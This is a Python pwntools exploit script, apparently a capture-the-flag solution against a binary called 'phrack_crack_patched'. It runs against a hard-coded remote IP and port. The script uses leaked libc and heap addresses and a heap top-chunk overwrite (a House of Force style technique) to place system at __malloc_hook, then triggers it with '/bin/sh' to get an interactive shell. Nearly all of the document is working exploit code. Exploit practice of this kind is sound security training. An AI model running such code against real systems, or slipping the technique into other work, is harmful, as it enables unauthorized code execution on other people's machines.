#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template phrack_crack_patched
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('phrack_crack_patched')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x3fd000)
# RUNPATH:  b'.'

def malloc(size,data):
    if isinstance(size,int): # convert the size to string
        size=str(size).encode()
    io.sendlineafter(b">",b"1") 
    io.sendlineafter(b"size:",size)
    io.sendlineafter(b"data:", data)
def edit(index,data):
    if isinstance(index,int): # convert the size to string
        index=str(index).encode()
    io.sendlineafter(b">",b"2") 
    io.sendlineafter(b"index:",index)
    io.sendlineafter(b"data:", data)

#io = start()
io=connect(b'3.110.206.162',30849)
io.recvuntil(b"for you!")
puts=int(io.recvline().strip(),16)
print(hex(puts))
libc=exe.libc
libc.address=puts-libc.sym.puts
io.recvuntil(b"for you:")
heap=int(io.recvline().strip(),16)
heap=heap-0x220
print(hex(heap))
io.recvuntil(b"")
malloc(24,b"/bin/sh\0"+b"A"*16)
edit(0,b"/bin/sh\0"+b"A"*16+p64(0xffffffffffffffff))
malloc(libc.sym.__malloc_hook-32-(heap+0x1310),b"A")
malloc(24,p64(libc.sym.system))
malloc(0x12f0+heap, b" ")

io.interactive()
